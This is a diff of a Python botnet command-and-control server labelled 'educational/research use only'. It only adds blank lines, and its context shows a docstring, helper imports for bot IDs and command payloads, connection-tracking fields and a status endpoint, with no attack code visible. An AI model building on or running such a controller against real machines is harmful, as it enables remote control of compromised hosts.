@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 """
+
 Enhanced Botnet Command & Control Server (Educational/Research Use Only)
 
 This is an improved version of the botnet controller that demonstrates:
@@ -12,6 +13,7 @@ This is an improved version of the botnet controller that demonstrates:
 
 Author: Enhanced Implementation
 License: Educational/Research Use Only
+
 """
 
 import asyncio
@@ -35,6 +37,7 @@ from utils import (
     generate_bot_id,
     create_command_payload,
 )
+
 
 
 class EnhancedBotnetServer:
@@ -68,6 +71,7 @@ class EnhancedBotnetServer:
         self.active_connections: Dict[str, asyncio.StreamWriter] = {}
         self.command_history: List[Dict[str, Any]] = []
         self.shutdown_event = asyncio.Event()
+
 
         # Performance monitoring
         self.stats = {
@@ -142,6 +146,7 @@ class EnhancedBotnetServer:
                 "server_version": "2.0 Enhanced",
                 "encryption_enabled": True
             }
+
             return web.json_response(status_data)
         except Exception as e:
             self.logger.error(f"Error in status API: {str(e)}")
@@ -650,3 +655,4 @@ if __name__ == "__main__":
         print("\nEnhanced server shutdown completed.")
     except Exception as e:
         print(f"Fatal error in enhanced server: {e}")
+
